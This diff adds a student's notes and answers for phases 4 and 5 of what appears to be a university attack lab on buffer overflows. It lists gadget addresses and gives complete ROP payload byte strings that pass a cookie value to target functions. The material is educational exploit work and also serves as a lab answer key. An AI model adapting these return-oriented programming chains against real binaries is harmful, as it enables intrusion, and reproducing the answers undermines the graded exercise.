@@ -1,0 +1,36 @@
+/* phase4: */
+/* we can use popq %rdi or movq <> %rdi, the former is not exit, but we can find: 58 (90) c3 popq %rax. */
+/* And then we need movq %rax, %rdi: 48 89 c7 c3 */
+/* At the last, the return address is 0x4017ec touch2 */
+/* so the bytes is: 0x30*40 popq_address cookie_value movq_address ec 17 40 00 00 00 00 00 */
+/* an answer: 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 */
+
+/* phase5: */
+/* We need a pointer to cookie string which in stack, so we need rsp and a offsset. */
+/* There is no addition and we cannot know where is the stack, so we must use: leaq (%rdi,%rsi,1),%rax. */
+/* We can find: movq %rax, %rdi in the last question, but how is the %rsi? */
+/* We cannot find %rsi, but we can find %ecx to %esi... */
+/* After let %rsi is corrcet offset, we ret to leaq instruction to get cookie string location. */
+/* use again movq %rax, %rdi */
+/* code: */
+movq %rsp, %rax @0x401A06 48 89 e0 c3
+movq %rax, %rdi @0x4019C5 48 89 c7 90 c3   <- rsp
+popq %rax       @0x4019AB 58 90 c3
+movl %eax, %edx @0x4019DD 89 C2 90 c3
+movl %edx, %ecx @0x401A34 89 D1 38 C9 C3
+movl %ecx, %esi @0x401A13 89 ce 90 90 C3
+leaq (%rdi,%rsi,1),%rax @0x4019d6 48 8d 04 37 C3
+movq %rax, %rdi @0x4019C5 48 89 c7 90 c3
+/* answer: */
+0x30*40     30 30 30 30 30 30 30 30...
+@0x401A06   06 1a 40 00 00 00 00 00
+@0x4019C5   C5 19 40 00 00 00 00 00     <- origianl rsp
+@0x4019AB   AB 19 40 00 00 00 00 00
+72:offset   48 00 00 00 00 00 00 00
+@0x4019DD   DD 19 40 00 00 00 00 00
+@0x401A34   34 1A 40 00 00 00 00 00
+@0x401A13   13 1A 40 00 00 00 00 00
+@0x4019d6   D6 19 40 00 00 00 00 00
+@0x4019C5   C5 19 40 00 00 00 00 00
+0x4018fA    FA 18 40 00 00 00 00 00
+cookie      35 39 62 39 39 37 66 61 00 offset = 9*8 = 72 
